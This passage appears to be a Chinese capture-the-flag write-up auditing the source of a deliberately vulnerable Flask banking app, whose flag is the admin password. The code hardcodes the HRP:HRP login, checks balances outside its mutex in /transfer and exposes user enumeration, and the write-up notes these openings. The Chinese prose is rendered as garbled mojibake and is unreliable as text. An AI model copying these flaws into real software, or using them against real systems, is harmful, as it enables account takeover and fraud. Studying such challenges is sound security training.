punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Initiator geolocation: Latitude </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">.6f</span><span class="token punctuation">&#125;</span></span><span class="token string">, Longitude </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">.6f</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Receiver's last login device: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Mobile'</span><span class="token punctuation">,</span> <span class="token string">'Web'</span><span class="token punctuation">,</span> <span class="token string">'ATM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Associated fees: $</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Remarks: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Regular transfer'</span><span class="token punctuation">,</span> <span class="token string">'Payment for invoice #'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Refund for transaction #'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string">"-"</span><span class="token operator">*</span><span class="token number">50</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'transfer_log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>log_data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/transfer'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>        receivers <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"receiver"</span><span class="token punctuation">)</span>    amount <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"amount"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> amount <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span>    logging_enabled <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"logs"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"true"</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Cannot transfer to self"</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">if</span> receiver <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Invalid user </span><span class="token interpolation"><span class="token punctuation">&#123;</span>receiver<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">400</span>        total_amount <span class="token operator">=</span> amount <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>receivers<span class="token punctuation">)</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> total_amount<span class="token punctuation">:</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>            <span class="token keyword">if</span> logging_enabled<span class="token punctuation">:</span>                log_transfer<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>            mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>            users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> amount            users<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> amount            mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/buy_flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_users'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_users</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'num'</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    selected_users <span class="token operator">=</span> random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"users"</span><span class="token punctuation">:</span> selected_users<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view_balance/&lt;username>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_balance</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/force_buy_flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session <span class="token keyword">or</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"HRP"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Permission denied"</span><span class="token punctuation">,</span> <span class="token number">403</span>    target_user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"target_user"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> target_user <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> successfully bought the flag!,"</span></span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> does not have sufficient funds"</span></span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç å¾ˆé•¿ï¼Œä¸€æ­¥ä¸€æ­¥è¾¹åˆ†æåŠŸèƒ½è¾¹å®¡è®¡</p><p>å…ˆæ˜¯ç™»å½•è·¯ç”± &#x2F;login</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">403</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éœ€è¦æ‰¾ä¸ªè´¦æˆ·å’Œå¯†ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Generate random users</span><span class="token keyword">def</span> <span class="token function">generate_random_users</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">2000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> usersusers <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span><span class="token comment"># Add an admin user with a random password</span>admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>flag_price <span class="token operator">=</span> <span class="token number">10000</span>flag <span class="token operator">=</span> admin_password  <span class="token comment"># The flag is the password of the admin user</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/reset'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> users    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token comment"># Clear all existing users</span>    users <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> admin_password    admin_password<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> flag    <span class="token comment"># Add an admin user with a random password</span>    admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token operator">=</span>admin_password    users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ‹¿åˆ°è´¦å¯†<code>HRP:HRP</code>ï¼ŒHRPç”¨æˆ·æœ‰6000å—ï¼Œadminæ²¡æœ‰é’±ï¼Œå…¶å®ƒç”¨æˆ·æ¯äººæœ‰2000å—ï¼ŒåŒæ—¶å¾—çŸ¥ flag è¦10000å—ï¼Œè€Œä¸”æ˜¯ admin çš„password</p><p>ç™»å½•è¿›å»ï¼Œæ¥ä¸‹æ¥æœ‰ä¸‹é¢è¿™äº›åŠŸèƒ½</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/transfer'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>        receivers <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"receiver"</span><span class="token punctuation">)</span>    amount <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"amount"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> amount <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span>    logging_enabled <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"logs"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"true"</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Cannot transfer to self"</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">if</span> receiver <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Invalid user </span><span class="token interpolation"><span class="token punctuation">&#123;</span>receiver<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">400</span>        total_amount <span class="token operator">=</span> amount <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>receivers<span class="token punctuation">)</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> total_amount<span class="token punctuation">:</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>            <span class="token keyword">if</span> logging_enabled<span class="token punctuation">:</span>                log_transfer<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>            mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>            users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> amount            users<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> amount            mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æä¾›äº†è½¬è´¦åŠŸèƒ½</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view_balance/&lt;username>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_balance</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¯¹åº”ç”¨æˆ·çš„ä½™é¢</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token 